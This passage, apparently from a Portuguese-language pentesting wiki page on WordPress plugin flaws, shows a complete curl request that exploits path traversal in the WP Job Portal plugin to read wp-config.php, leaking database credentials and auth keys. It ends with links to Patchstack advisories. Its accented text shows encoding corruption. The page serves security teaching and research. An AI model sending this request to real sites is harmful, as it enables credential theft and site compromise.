curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conte√∫do de `wp-config.php`, vazando credenciais do DB e chaves de autentica√ß√£o.

## Refer√™ncias

- [Vulnerabilidade de Exclus√£o de Arquivo Arbitr√°rio N√£o Autenticada no Tema Litho](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [M√∫ltiplas Vulnerabilidades Cr√≠ticas Corrigidas no Plugin WP Job Portal](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Caso Raro de Escala√ß√£o de Privil√©gios no Plugin ASE Afetando Mais de 100k Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [Mudan√ßa 7.6.3 do ASE ‚Äì excluir fun√ß√µes originais na atualiza√ß√£o do perfil](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
